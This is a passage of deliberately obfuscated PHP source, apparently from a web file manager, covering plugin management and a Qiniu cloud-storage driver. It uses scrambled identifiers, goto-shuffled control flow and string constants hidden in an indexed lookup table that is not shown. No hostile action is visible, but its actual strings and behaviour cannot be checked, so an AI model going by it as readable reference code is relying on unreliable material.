$this->add($A©‹ŞÆØ‰‹); } protected function removeFromTag($e¼Â“¼àƒÎ, $aáï»ØÂê, $eíó†›»†Ñ) { $f“ Æïğµ =& $_SERVER[‡’¶øåüç˜]; if (!$this->getByTagID($e¼Â“¼àƒÎ, $eíó†›»†Ñ) || !$aáï»ØÂê) { return !1; } if (is_array($aáï»ØÂê)) { $aáï»ØÂê = array($f“ Æïğµ[7], $aáï»ØÂê); } $c”Äƒ¹Ñç¥ = array($f“ Æïğµ[1434] => 0, $f“ Æïğµ[447] => $eíó†›»†Ñ, $f“ Æïğµ[400] => $f“ Æïğµ[2216] . $e¼Â“¼àƒÎ, $f“ Æïğµ[399] => $aáï»ØÂê); return $this->where($c”Äƒ¹Ñç¥)->delete(); } protected function removeByTag($e…Éõ‰’Ã, $Dï»›»ó‘Ö) { $d§›Ä¢Ÿö– =& $_SERVER[‡’¶øåüç˜]; if (!$this->getByTagID($e…Éõ‰’Ã, $Dï»›»ó‘Ö)) { return !1; } $DÍäß¿æ¿ = array($d§›Ä¢Ÿö–[1434] => 0, $d§›Ä¢Ÿö–[447] => $Dï»›»ó‘Ö, $d§›Ä¢Ÿö–[400] => $d§›Ä¢Ÿö–[2216] . $e…Éõ‰’Ã); return $this->where($DÍäß¿æ¿)->delete(); } protected function removeBySource($E®×´ƒ”‘§, $cØï¨½) { $E¬¦Îê„ã =& $_SERVER[‡’¶øåüç˜]; if (!$E®×´ƒ”‘§ || !$cØï¨½) { return !1; } if (is_array($cØï¨½)) { $cØï¨½ = array($E¬¦Îê„ã[7], $cØï¨½); } $fš¥éÊÜâ‰ = array($E¬¦Îê„ã[1434] => 0, $E¬¦Îê„ã[399] => $cØï¨½, $E¬¦Îê„ã[447] => array($E¬¦Îê„ã[931], 0), $E¬¦Îê„ã[400] => $E¬¦Îê„ã[2216] . $E®×´ƒ”‘§); return $this->where($fš¥éÊÜâ‰)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\160\x6c\x75\x67\x69\156\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\163\164\x61\x74\165\x73", "\162\145\147\x69\x65\163\x74", "\x63\157\x6e\x66\151\147"); public function loadList($Fï‹ÜˆŠ½Ÿ = false) { $AŠƒ“œ¤ä = array_to_keyvalue($this->listData(), $_SERVER[‡’¶øåüç˜][28]); if ($Fï‹ÜˆŠ½Ÿ) { return $AŠƒ“œ¤ä[$Fï‹ÜˆŠ½Ÿ]; } return $AŠƒ“œ¤ä; } public function init() { $FÌÀ°”Øİ« =& $_SERVER[‡’¶øåüç˜]; Hook::trigger($FÌÀ°”Øİ«[2217]); $Dİª¿¹ = $this->loadPluginList(); foreach ($Dİª¿¹ as $Aˆ…’Ğº => $e§â½Ÿ‰±) { $DØˆÁ¬¬œé = $this->appAllow($Aˆ…’Ğº, $e§â½Ÿ‰±); if (!$DØˆÁ¬¬œé) { continue; } foreach ($e§â½Ÿ‰±[$FÌÀ°”Øİ«[2218]] as $cÎÍ«ù›…ô => $Cœì—‰…¦Ä) { Hook::bind($cÎÍ«ù›…ô, $Cœì—‰…¦Ä); } } Hook::trigger($FÌÀ°”Øİ«[2219]); Hook::trigger(ACTION); } public function appAllow($E±“÷ïÁ•ã, $CÌÜÎ¬‘¼í, $aƒ¨İ—ªÏõ = true) { $Dº´é¾‡î =& $_SERVER[‡’¶øåüç˜]; $Fç’ğ“ëÃ¡ = PLUGIN_DIR . $E±“÷ïÁ•ã . $Dº´é¾‡î[2220]; if (!is_array($CÌÜÎ¬‘¼í) || !is_array($CÌÜÎ¬‘¼í[$Dº´é¾‡î[2218]]) || !is_file($Fç’ğ“ëÃ¡) || $CÌÜÎ¬‘¼í[$Dº´é¾‡î[695]] != 1) { return !1; } if ($aƒ¨İ—ªÏõ && !Action($Dº´é¾‡î[2221])->checkAuth($E±“÷ïÁ•ã)) { return !1; } return !0; } public function unInstall($BÚÇÜ©Â”—) { $f²ŸåÆ§”± =& $_SERVER[‡’¶øåüç˜]; $e±Ã»­ˆ«Ú = $this->loadList($BÚÇÜ©Â”—); if (file_exists(PLUGIN_DIR . $BÚÇÜ©Â”—)) { Hook::apply($BÚÇÜ©Â”— . $f²ŸåÆ§”±[2222]); } $this->remove($e±Ã»­ˆ«Ú[$f²ŸåÆ§”±[371]]); } public function changeStatus($A„”´›‘«‚, $eÙ«İÆÓî±) { $DÁ–æôòéâ =& $_SERVER[‡’¶øåüç˜]; $EàòÕ–ˆ¤¬ = $this->loadList($A„”´›‘«‚); if ($eÙ«İÆÓî±) { Hook::apply($A„”´›‘«‚ . $DÁ–æôòéâ[2223]); } $this->update($EàòÕ–ˆ¤¬[$DÁ–æôòéâ[371]], array($DÁ–æôòéâ[2224] => $eÙ«İÆÓî±)); } public function appRegist($fÄÒÛ·ëÍá, $aÄØªµŞ¡å) { $DÑ¸—„ùõê =& $_SERVER[‡’¶øåüç˜]; $DÓ÷ÏŞ¿ = $this->loadList($fÄÒÛ·ëÍá); if ($DÓ÷ÏŞ¿) { $this->update($DÓ÷ÏŞ¿[$DÑ¸—„ùõê[371]], array($DÑ¸—„ùõê[2218] => $aÄØªµŞ¡å)); } else { $dĞÑ±¸ò = array($DÑ¸—„ùõê[28] => $fÄÒÛ·ëÍá, $DÑ¸—„ùõê[2218] => $aÄØªµŞ¡å, $DÑ¸—„ùõê[695] => 0, $DÑ¸—„ùõê[6] => $this->getConfigDefault($fÄÒÛ·ëÍá)); $this->insert($dĞÑ±¸ò); } } public function getConfigDefault($F«¡¿øÑÃ) { $d¶¡ÛÖôÓİ =& $_SERVER[‡’¶øåüç˜]; $D‹®…×ã­ª = array(); $fÙëŒéĞÚ¬ = $this->getPackageJson($F«¡¿øÑÃ); if (!$fÙëŒéĞÚ¬ && is_array($fÙëŒéĞÚ¬[$d¶¡ÛÖôÓİ[2225]])) { return $D‹®…×ã­ª; } foreach ($fÙëŒéĞÚ¬[$d¶¡ÛÖôÓİ[2225]] as $C’¾Ÿ¾À—¸ => $d¼ÜŠ´ÅÆ¦) { if (!isset($d¼ÜŠ´ÅÆ¦[$d¶¡ÛÖôÓİ[363]]) || isset($D‹®…×ã­ª[$C’¾Ÿ¾À—¸])) { continue; } $D‹®…×ã­ª[$C’¾Ÿ¾À—¸] = $d¼ÜŠ´ÅÆ¦[$d¶¡ÛÖôÓİ[363]]; } return $D‹®…×ã­ª; } public function getPackageJson($d‘Ë¤Èµ½¤) { return Hook::apply($d‘Ë¤Èµ½¤ . $_SERVER[‡’¶øåüç˜][2226]); } public function getConfig($fˆè›ÇòÅ, $b¾ÛŒáö•í = false) { $e¹ªÇ£¬‚Í =& $_SERVER[‡’¶øåüç˜]; $EŠèï†ò‘ = array(); $d¬ï²ƒÙò = $this->loadList($fˆè›ÇòÅ); if ($d¬ï²ƒÙò && is_array($d¬ï²ƒÙò[$e¹ªÇ£¬‚Í[6]])) { $EŠèï†ò‘ = $d¬ï²ƒÙò[$e¹ªÇ£¬‚Í[6]]; } if (!$EŠèï†ò‘ || $b¾ÛŒáö•í) { $EŠèï†ò‘ = $this->getConfigDefault($fˆè›ÇòÅ); } return $EŠèï†ò‘; } public function setConfig($D¿óÇõåø, $fË¸‰ˆø‰ = false) { goto B¼„èë©¹±; c¥ˆ¢³½È: $FÖ…Ä«´ = $B¼ê‰‘†ïç[$B™Á­Ïô½ [6]]; if ($fË¸‰ˆø‰ == !1) { $FÖ…Ä«´ = array(); $fË¸‰ˆø‰ = $this->getConfigDefault($D¿óÇõåø); } foreach ($fË¸‰ˆø‰ as $ašî™•¯° => $aà½É×·¢) { $FÖ…Ä«´[$ašî™•¯°] = is_string($aà½É×·¢) ? trim($aà½É×·¢) : $aà½É×·¢; } goto fšÂ¥“•µñ; fšÂ¥“•µñ: $this->update($B¼ê‰‘†ïç[$B™Á­Ïô½ [371]], array($B™Á­Ïô½ [6] => $FÖ…Ä«´)); goto B‰§äë½óê; B¼„èë©¹±: $B™Á­Ïô½  =& $_SERVER[‡’¶øåüç˜]; $B¼ê‰‘†ïç = $this->loadList($D¿óÇõåø); if (!$B¼ê‰‘†ïç) { return !1; } goto c¥ˆ¢³½È; B‰§äë½óê: } public function viewList() { goto c‚—©Ù†Æ; cãƒÃ—àÏá: $e¹¤Ş˜‹Ü = $this->loadPluginList(); $ağ–ÓÀÜƒ = array(); foreach ($e¹¤Ş˜‹Ü as $DÜ´âªÁó™ => $bÀÁÏÀŠ£) { unset($bÀÁÏÀŠ£[$DÙÑƒ´„†¶[2218]], $bÀÁÏÀŠ£[$DÙÑƒ´„†¶[6]]); $aë¦ß  ƒ• = PLUGIN_DIR . $bÀÁÏÀŠ£[$DÙÑƒ´„†¶[28]] . $DÙÑƒ´„†¶[2220]; if (!is_file($aë¦ß  ƒ•)) { continue; } $aİñÛ¡Áœ = Hook::apply($bÀÁÏÀŠ£[$DÙÑƒ´„†¶[28]] . $DÙÑƒ´„†¶[2226]); if (is_array($aİñÛ¡Áœ)) { $ağ–ÓÀÜƒ[$DÜ´âªÁó™] = array_merge($bÀÁÏÀŠ£, $aİñÛ¡Áœ); } } goto AÄÎ‰øºóÛ; AÄÎ‰øºóÛ: return $ağ–ÓÀÜƒ; goto A®²ËÊÎ–Ç; c‚—©Ù†Æ: $DÙÑƒ´„†¶ =& $_SERVER[‡’¶øåüç˜]; $e¹¤Ş˜‹Ü = $this->loadList(); $this->pluginScan($e¹¤Ş˜‹Ü); goto cãƒÃ—àÏá; A®²ËÊÎ–Ç: } private function loadPluginList() { $c©Ş§ÏÖé =& $_SERVER[‡’¶øåüç˜]; $c·ËÇÀ«°Ë = $this->loadList(); if (strtolower(MOD) == $c©Ş§ÏÖé[2227]) { return $c·ËÇÀ«°Ë; } $côÃ‚è«‡ = Hook::trigger($c©Ş§ÏÖé[2228], $c·ËÇÀ«°Ë); if ($c·ËÇÀ«°Ë && !$côÃ‚è«‡) { die; } return $côÃ‚è«‡ ? $côÃ‚è«‡ : $c·ËÇÀ«°Ë; } private function pluginScan($dÊ„î¤•İæ) { $c’ÉİŸåîœ =& $_SERVER[‡’¶øåüç˜]; recursion_dir(PLUGIN_DIR, $e‹±ô¼»ôë, $f×†ŠÂ¯¾ß, 0); foreach ($e‹±ô¼»ôë as $EÄ¶ŸÆ‹‘”) { $eË»‘ïÂ‘ = get_path_this($EÄ¶ŸÆ‹‘”); if (isset($dÊ„î¤•İæ[$eË»‘ïÂ‘]) || !file_exists($EÄ¶ŸÆ‹‘” . $c’ÉİŸåîœ[2229]) || !file_exists($EÄ¶ŸÆ‹‘” . $c’ÉİŸåîœ[2220])) { continue; } Hook::apply($eË»‘ïÂ‘ . $c’ÉİŸåîœ[2223]); } } } goto e‡§°½”×œ; CõÒÈ¢Îñ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($AÍŒÎåœ‘‡) { parent::__construct(); require_once SDK_DIR . $_SERVER[‡’¶øåüç˜][1218]; $this->_init($AÍŒÎåœ‘‡); } public function _init($F¡¸ˆº¾ßÜ) { goto DÎÊŒ•½; dèÙÅˆëˆ : $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto E¡š‘¼°…ß; DÎÊŒ•½: $a÷ÕÇƒàÚ =& $_SERVER[‡’¶øåüç˜]; foreach ($F¡¸ˆº¾ßÜ as $DÛÉä©ŸÕí => $A¯ª–áÙâ“) { if (isset($this->{$DÛÉä©ŸÕí})) { $this->{$DÛÉä©ŸÕí} = $A¯ª–áÙâ“; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($a÷ÕÇƒàÚ[1219] . LNG($a÷ÕÇƒàÚ[1179])); } goto dèÙÅˆëˆ ; E¡š‘¼°…ß: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto cÖ¥Š¤´‘Ş; cÖ¥Š¤´‘Ş: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($eÅÒã‹ò¢é, $dàÍ”„Çã = '', $E÷Ë˜­»Î = REPEAT_RENAME) { if ($this->setContent($eÅÒã‹ò¢é, $dàÍ”„Çã)) { return $this->getPathOuter($eÅÒã‹ò¢é); } return !1; } public function mkdir($a¢Ş¬‚ĞÉº, $dóÎí‹¢‰ = REPEAT_SKIP) { goto cˆ¥îù¯ˆ¥; e…ªĞ‰­¥: if (!$this->mkfile($AùÇŒ¶àù¸)) { return !1; } if (!$this->moveFile($AùÇŒ¶àù¸, $a¢Ş¬‚ĞÉº)) { $this->delFile($AùÇŒ¶àù¸); return !1; } return $this->getPathOuter($bÏ¦Ñø´×); goto D©æÉÑ›Œ­; dÍæõØ÷Â¼: $a¢Ş¬‚ĞÉº = $bÏ¦Ñø´× . $EÔ¾ÇÒ»¡å[8]; $EÔ‰±Å¯¸ = get_path_this($bÏ¦Ñø´×); $AùÇŒ¶àù¸ = $a¢Ş¬‚ĞÉº . $EÔ‰±Å¯¸; goto e…ªĞ‰­¥; cˆ¥îù¯ˆ¥: $EÔ¾ÇÒ»¡å =& $_SERVER[‡’¶øåüç˜]; $bÏ¦Ñø´× = trim($a¢Ş¬‚ĞÉº, $EÔ¾ÇÒ»¡å[8]); if ($this->_isFolder($bÏ¦Ñø´×)) { return $this->getPathOuter($bÏ¦Ñø´×); } goto dÍæõØ÷Â¼; D©æÉÑ›Œ­: } public function copyFile($A¡ÒĞ‘–›¦, $bºÓµ’Ú³) { $CêğÑµå = $this->bucketManager->copy($this->bucket, $A¡ÒĞ‘–›¦, $this->bucket, $bºÓµ’Ú³, !0); return $CêğÑµå ? !1 : $this->getPathOuter($bºÓµ’Ú³); } public function moveFile($AšÓ¡ğßëÁ, $c¥ö…êÆñ) { $DŸ¼ÍÀŸ«à = $this->bucketManager->move($this->bucket, $AšÓ¡ğßëÁ, $this->bucket, $c¥ö…êÆñ, !0); return $DŸ¼ÍÀŸ«à ? !1 : $this->getPathOuter($c¥ö…êÆñ); } public function delFile($e™¼æƒ¯) { if (!$this->exist($e™¼æƒ¯)) { return !0; } $cÈÒ †ŠŠ¾ = $this->bucketManager->delete($this->bucket, $e™¼æƒ¯); return $cÈÒ †ŠŠ¾ ? !1 : !0; } public function delFolder($eôèõšƒĞ) { goto e¦Àå®Å´; e¦Àå®Å´: if (!$this->exist($eôèõšƒĞ)) { return !0; } $fìğ‚ïÅè¬ = $this->fileList($eôèõšƒĞ); if (empty($fìğ‚ïÅè¬)) { return !0; } goto dŠ°ÆÂª‚ä; E¬‰ÓÁìá›: return !0; goto A»¸ÂÊ½½º; dŠ°ÆÂª‚ä: $d™²œ„ëöÊ = 1000; if (count($fìğ‚ïÅè¬) <= $d™²œ„ëöÊ) { return $this->qnDelObj($fìğ‚ïÅè¬) ? !1 : !0; } foreach (array_chunk($fìğ‚ïÅè¬, $d™²œ„ëöÊ) as $cìœ–Œ¾ÆÃ) { $e˜Ÿíß‚ø¢ = $this->qnDelObj($cìœ–Œ¾ÆÃ); if ($e˜Ÿíß‚ø¢) { return !1; } } goto E¬‰ÓÁìá›; A»¸ÂÊ½½º: } private function qnDelObj($cÇİ»¯»‘¥) { $DĞù¢¨ğ½ = $this->bucketManager->buildBatchDelete($this->bucket, $cÇİ»¯»‘¥); list($fÆ…´ôÆ„, $aä¹ÓÙ·ÎÅ) = $this->bucketManager->batch($DĞù¢¨ğ½); return $aä¹ÓÙ·ÎÅ; } private function fileList($c­™Š‘ù£Š, $b‹À‰ŞšÜ¹ = 0) { goto d¶²æ«µ°; d¶²æ«µ°: $dä—‹ç°ª =& $_SERVER[‡’¶øåüç˜]; $c­™Š‘ù£Š = trim($c­™Š‘ù£Š, $dä—‹ç°ª[8]); $a¼»ÕŠ¢Š¤ = empty($c­™Š‘ù£Š) ? $dä—‹ç°ª[33] : $c­™Š‘ù£Š . $dä—‹ç°ª[8]; goto fÑéåïÊ¾Í; b™Ã …®®: $D–ëøÒ„Íˆ = array(); while (!0) { list($f¯°ôÂÖˆÄ, $Cµç¸»ñ½) = $this->bucketManager->listFiles($this->bucket, $a¼»ÕŠ¢Š¤, $b½È”ŸÌˆÍ, $B¼ß•ÑÏƒ, $D§ï»Ïİšá); if ($Cµç¸»ñ½) { return !1; } $b½È”ŸÌˆÍ = array_key_exists($dä—‹ç°ª[1190], $f¯°ôÂÖˆÄ) ? $b½È”ŸÌˆÍ = $f¯°ôÂÖˆÄ[$dä—‹ç°ª[1220]] : $dä—‹ç°ª[33]; foreach ($f¯°ôÂÖˆÄ[$dä—‹ç°ª[1221]] as $F¿ãÍéˆ­) { $F§‚òã£ï = $F¿ãÍéˆ­[$dä—‹ç°ª[89]]; if ($b‹À‰ŞšÜ¹) { $F§‚òã£ï = array($dä—‹ç°ª[28] => $F§‚òã£ï, $dä—‹ç°ª[77] => $F¿ãÍéˆ­[$dä—‹ç°ª[1222]]); } $D–ëøÒ„Íˆ[] = $F§‚òã£ï; } if ($b½È”ŸÌˆÍ == $dä—‹ç°ª[33]) { break; } } return $D–ëøÒ„Íˆ; goto c¬éïº”†¡; fÑéåïÊ¾Í: $b½È”ŸÌˆÍ = $dä—‹ç°ª[33]; $B¼ß•ÑÏƒ = 1000; $D§ï»Ïİšá = $dä—‹ç°ª[33]; goto b™Ã …®®; c¬éïº”†¡: } public function rename($A„¢œÂ­Õ, $B±¼Ù¿‚ÔÓ) { return $this->renameObject($A„¢œÂ­Õ, $B±¼Ù¿‚ÔÓ); } public function fileInfo($bÜÍ¸§¤æ, $e¡ñé«Ãä = false, $FŠ³³ÃŞ• = array()) { goto bö¼ßŠÎê; AÉ¤’­œáã: if (empty($FŠ³³ÃŞ•)) { $FŠ³³ÃŞ• = $this->objectMeta($bÜÍ¸§¤æ); if (!$FŠ³³ÃŞ•) { return $D¢¢¦·¸–ç; } } if (isset($FŠ³³ÃŞ•[$c«Öê®±[1223]])) { $D¢¢¦·¸–ç[$c«Öê®±[107]] = substr($FŠ³³ÃŞ•[$c«Öê®±[1223]] . $c«Öê®±[33], 0, 10); } if (isset($FŠ³³ÃŞ•[$c«Öê®±[1222]])) { $D¢¢¦·¸–ç[$c«Öê®±[77]] = $FŠ³³ÃŞ•[$c«Öê®±[1222]]; } goto d“Îğ·ÄŸ; bö¼ßŠÎê: $c«Öê®± =& $_SERVER[‡’¶øåüç˜]; if ($e¡ñé«Ãä) { return array($c«Öê®±[28] => $this->pathThis($bÜÍ¸§¤æ), $c«Öê®±[75] => $this->getPathOuter($c«Öê®±[8] . $bÜÍ¸§¤æ), $c«Öê®±[29] => $c«Öê®±[171], $c«Öê®±[77] => isset($FŠ³³ÃŞ•[$c«Öê®±[1222]]) ? $FŠ³³ÃŞ•[$c«Öê®±[1222]] : 0, $c«Öê®±[165] => $this->ext($bÜÍ¸§¤æ)); } $D¢¢¦·¸–ç = array($c«Öê®±[28] => $this->pathThis($bÜÍ¸§¤æ), $c«Öê®±[75] => $this->getPathOuter($c«Öê®±[8] . $bÜÍ¸§¤æ), $c«Öê®±[29] => $c«Öê®±[171], $c«Öê®±[191] => 0, $c«Öê®±[107] => 0, $c«Öê®±[77] => 0, $c«Öê®±[165] => $this->ext($bÜÍ¸§¤æ), $c«Öê®±[192] => !0, $c«Öê®±[193] => !0); goto AÉ¤’­œáã; d“Îğ·ÄŸ: return $D¢¢¦·¸–ç; goto f¬ô®«¢œ; f¬ô®«¢œ: } public function folderInfo($BÂšºò°š‡, $EöóÄ¡«æ = false) { goto CÁëÅÊ…Ã; CÁëÅÊ…Ã: $AòãÏ„¿Ë¢ =& $_SERVER[‡’¶øåüç˜]; if ($EöóÄ¡«æ) { return array($AòãÏ„¿Ë¢[28] => $this->pathThis($BÂšºò°š‡), $AòãÏ„¿Ë¢[75] => $this->getPathOuter($AòãÏ„¿Ë¢[8] . $BÂšºò°š‡), $AòãÏ„¿Ë¢[29] => $AòãÏ„¿Ë¢[76]); } $Fùä¨Â®å = array($AòãÏ„¿Ë¢[28] => $this->pathThis($BÂšºò°š‡), $AòãÏ„¿Ë¢[75] => $this->getPathOuter($AòãÏ„¿Ë¢[8] . $BÂšºò°š‡), $AòãÏ„¿Ë¢[29] => $AòãÏ„¿Ë¢[76], $AòãÏ„¿Ë¢[191] => 0, $AòãÏ„¿Ë¢[107] => 0, $AòãÏ„¿Ë¢[1169] => !0, $AòãÏ„¿Ë¢[1170] => !0); goto C¿¸®ğË”; C¿¸®ğË”: $BÂšºò°š‡ = rtrim($BÂšºò°š‡, $AòãÏ„¿Ë¢[8]) . $AòãÏ„¿Ë¢[8]; $c‰çˆç¨Œ² = $this->objectMeta($BÂšºò°š‡); if (isset($c‰çˆç¨Œ²[$AòãÏ„¿Ë¢[1223]])) { $Fùä¨Â®å[$AòãÏ„¿Ë¢[107]] = substr($c‰çˆç¨Œ²[$AòãÏ„¿Ë¢[1223]] . $AòãÏ„¿Ë¢[33], 0, 10); } goto b¾—ªŒ»Ì´; b¾—ªŒ»Ì´: return $Fùä¨Â®å; goto Eãğâ­˜¶ˆ; Eãğâ­˜¶ˆ: } public function listPath($BåÍƒä³¤õ, $cæƒà¢²å± = false) { goto A…ã†ÒŞ±Å; FŞ¤‡ºÏÏ: $bŒ¸§»µÍ = $cï§¦Ï¶‹[33]; $A’¯‰ƒ¯Ç÷ = 1000; $DÎ’¬ùë¥… = $cï§¦Ï¶‹[8]; goto cæ«“½–’»; A…ã†ÒŞ±Å: $cï§¦Ï¶‹ =& $_SERVER[‡’¶øåüç˜]; $BåÍƒä³¤õ = trim($BåÍƒä³¤õ, $cï§¦Ï¶‹[8]); $E±Ù«¢òÓ = empty($BåÍƒä³¤õ) ? $cï§¦Ï¶‹[33] : $BåÍƒä³¤õ . $cï§¦Ï¶‹[8]; goto FŞ¤‡ºÏÏ; cæ«“½–’»: $B—Ë…Ÿ¶¤‚ = $A¦–àêæäê = array(); while (!0) { list($Eåİš°Š‘ä, $D¯‰¯•„Òè) = $this->bucketManager->listFiles($this->bucket, $E±Ù«¢òÓ, $bŒ¸§»µÍ, $A’¯‰ƒ¯Ç÷, $DÎ’¬ùë¥…); if ($D¯‰¯•„Òè) { return !1; } $bŒ¸§»µÍ = array_key_exists($cï§¦Ï¶‹[1190], $Eåİš°Š‘ä) ? $bŒ¸§»µÍ = $Eåİš°Š‘ä[$cï§¦Ï¶‹[1220]] : $cï§¦Ï¶‹[33]; if (isset($Eåİš°Š‘ä[$cï§¦Ï¶‹[1224]])) { foreach ($Eåİš°Š‘ä[$cï§¦Ï¶‹[1224]] as $fÆÌğêÏ³À) { if ($fÆÌğêÏ³À == $E±Ù«¢òÓ) { continue; } $B—Ë…Ÿ¶¤‚[] = $this->folderInfo($fÆÌğêÏ³À, $cæƒà¢²å±); } } if (isset($Eåİš°Š‘ä[$cï§¦Ï¶‹[1221]])) { foreach ($Eåİš°Š‘ä[$cï§¦Ï¶‹[1221]] as $Cä¨¡»ôÎñ) { if ($Cä¨¡»ôÎñ[$cï§¦Ï¶‹[89]] == $E±Ù«¢òÓ) { continue; } $A¦–àêæäê[] = $this->fileInfo($Cä¨¡»ôÎñ[$cï§¦Ï¶‹[89]], $cæƒà¢²å±, $Cä¨¡»ôÎñ); } } if ($bŒ¸§»µÍ == $cï§¦Ï¶‹[33]) { break; } } return array($cï§¦Ï¶‹[74] => $B—Ë…Ÿ¶¤‚, $cï§¦Ï¶‹[73] => $A¦–àêæäê); goto B×ñÎÁóñÈ; B×ñÎÁóñÈ: } public function has($FšÈŒ¨‡“Î, $D‹’ÍÇî­ = false, $bËØËÅÄîÜ = true) { goto d²”„÷ª; B’Ê¹ØÏ¸: $Bœ²ÃøÕ = $fŠøµó¶’„[33]; $E†à§ğÌÜ = 1000; $c›çÎºÖë„ = $fŠøµó¶’„[8]; goto E› œÀ®·Ú; E› œÀ®·Ú: $C©ºŠÀÅ’Â = 0; $b¿õ„Ğ‹™ = 0; while (!0) { list($fÖŒ «’»ç, $c×Å‡ˆğ‰Ì) = $this->bucketManager->listFiles($this->bucket, $dğ‹…Š¡¥, $Bœ²ÃøÕ, $E†à§ğÌÜ, $c›çÎºÖë„); if ($c×Å‡ˆğ‰Ì) { return !1; } $Bœ²ÃøÕ = array_key_exists($fŠøµó¶’„[1190], $fÖŒ «’»ç) ? $Bœ²ÃøÕ = $fÖŒ «’»ç[$fŠøµó¶’„[1220]] : $fŠøµó¶’„[33]; if ($D‹’ÍÇî­) { if (!empty($fÖŒ «’»ç[$fŠøµó¶’„[1221]])) { $C©ºŠÀÅ’Â += count($fÖŒ «’»ç[$fŠøµó¶’„[1221]]); } if (!empty($fÖŒ «’»ç[$fŠøµó¶’„[1224]])) { $b¿õ„Ğ‹™ += count($fÖŒ «’»ç[$fŠøµó¶’„[1224]]); } if ($Bœ²ÃøÕ === $fŠøµó¶’„[33]) { break; } continue; } if ($bËØËÅÄîÜ) { if (!empty($fÖŒ «’»ç[$fŠøµó¶’„[1221]])) { return !0; } } else { if (!empty($fÖŒ «’»ç[$fŠøµó¶’„[1224]])) { return !0; } } if ($Bœ²ÃøÕ == $fŠøµó¶’„[33]) { break; } } goto D»…íÍ…; d²”„÷ª: $fŠøµó¶’„ =& $_SERVER[‡’¶øåüç˜]; $FšÈŒ¨‡“Î = trim($FšÈŒ¨‡“Î, $fŠøµó¶’„[8]); $dğ‹…Š¡¥ = empty($FšÈŒ¨‡“Î) ? $fŠøµó¶’„[33] : $FšÈŒ¨‡“Î . $fŠøµó¶’„[8]; goto B’Ê¹ØÏ¸; D»…íÍ…: if ($D‹’ÍÇî­) { return array($fŠøµó¶’„[195] => $C©ºŠÀÅ’Â, $fŠøµó¶’„[196] => $b¿õ„Ğ‹™); } return !1; goto E×¹ãÅâ; E×¹ãÅâ: } public function listAll($Dà™¤è Ï¤) { $cƒùæ ĞÎ =& $_SERVER[‡’¶øåüç˜]; $D™Şœ¬Ã—å = $this->fileList($Dà™¤è Ï¤, 1); $F†ê£¦Š˜ = array(); foreach ($D™Şœ¬Ã—å as $cƒ“´¯„Èò) { $F†ê£¦Š˜[$cƒ“´¯„Èò[$cƒùæ ĞÎ[28]]] = $cƒ“´¯„Èò[$cƒùæ ĞÎ[77]]; } return $this->listAllFiles($Dà™¤è Ï¤, array_keys($F†ê£¦Š˜), $F†ê£¦Š˜); } public function canRead($d„Ããªˆàî) { return $this->exist($d„Ããªˆàî) ? !0 : !1; } public function canWrite($dëîÎĞ—) { return $this->exist($dëîÎĞ—) ? !0 : !1; } public function getContent($aÀ–ï’Ä¾­) { return $this->fileSubstr($aÀ–ï’Ä¾­, 0, -1); } public function setContent($D¶šò¼òĞå, $d”“›˜ğ™¥ = '') { $BÄ“é¾Œ¯Ê = $this->tempFile($this->pathThis($D¶šò¼òĞå)); file_put_contents($BÄ“é¾Œ¯Ê, $d”“›˜ğ™¥); if ($this->upload($D¶šò¼òĞå, $BÄ“é¾Œ¯Ê)) { $this->tempFileRemve($BÄ“é¾Œ¯Ê); return !0; } return !1; } public function refreshUrls($d‡¼™ÅÒÛ) { goto A‚‰½ÎØôƒ; A‚‰½ÎØôƒ: $AŠ‘©œËÜá =& $_SERVER[‡’¶øåüç˜]; $C‹ÕÄŠíÈ = array(); if (is_array($d‡¼™ÅÒÛ)) { foreach ($d‡¼™ÅÒÛ as $D¨®Í˜î) { $C‹ÕÄŠíÈ[] = $this->link($D¨®Í˜î); } } else { $C‹ÕÄŠíÈ[] = $this->link($d‡¼™ÅÒÛ); } goto f–—’è²„; f–—’è²„: $aõ¬‘ø¬Üš = new Qiniu\Cdn\CdnManager($this->auth); list($A‚‘íÔ‚, $a¨çñøãÁ¬) = $aõ¬‘ø¬Üš->refreshUrls($C‹ÕÄŠíÈ); if ($a¨çñøãÁ¬) { return !1; } goto eÙ¼í–àŒÏ; eÙ¼í–àŒÏ: return $A‚‘íÔ‚[$AŠ‘©œËÜá[1225]] == $AŠ‘©œËÜá[702] ? !0 : !1; goto DÄ¢ŠÁ¤Í; DÄ¢ŠÁ¤Í: } public function fileSubstr($c›ÈØÒ¼ò’, $EÏÎ‹·’Û³, $Dª¸³ÊÍ) { $BÅÖâ°¨ÇÁ =& $_SERVER[‡’¶øåüç˜]; if (!($BÑÙ—§Ò˜ = $this->link($c›ÈØÒ¼ò’))) { return !1; } $f½¢îŒ¾†• = !1; if ($Dª¸³ÊÍ > 0) { $FçŠ­Ñâ” = $EÏÎ‹·’Û³ + $Dª¸³ÊÍ - 1; $f½¢îŒ¾†• = array($BÅÖâ°¨ÇÁ[1226] . $EÏÎ‹·’Û³ . $BÅÖâ°¨ÇÁ[424] . $FçŠ­Ñâ”); } $c‹Ä®ˆÁ¬• = url_request($BÑÙ—§Ò˜, $BÅÖâ°¨ÇÁ[220], !1, $f½¢îŒ¾†•); return $c‹Ä®ˆÁ¬•[$BÅÖâ°¨ÇÁ[695]] ? $c‹Ä®ˆÁ¬•[$BÅÖâ°¨ÇÁ[1042]] : !1; } public function upload($e±Ö³ Õ¶, $DŒğæ„ê­Û, $f´Îê¬Û¦ù = false, $D­¾ïà„ë– = REPEAT_REPLACE) { $eÒò‰×ˆª = new Qiniu\Storage\UploadManager(); $d®³ª˜¯Ù¬ = $this->auth->uploadToken($this->bucket, $e±Ö³ Õ¶); $aæÇÔ‘ = get_file_mime(get_path_ext($DŒğæ„ê­Û)); list($dÛµœ™‘, $CåŸ…ÒÄÉ) = $eÒò‰×ˆª->putFile($d®³ª˜¯Ù¬, $e±Ö³ Õ¶, $DŒğæ„ê­Û, null, 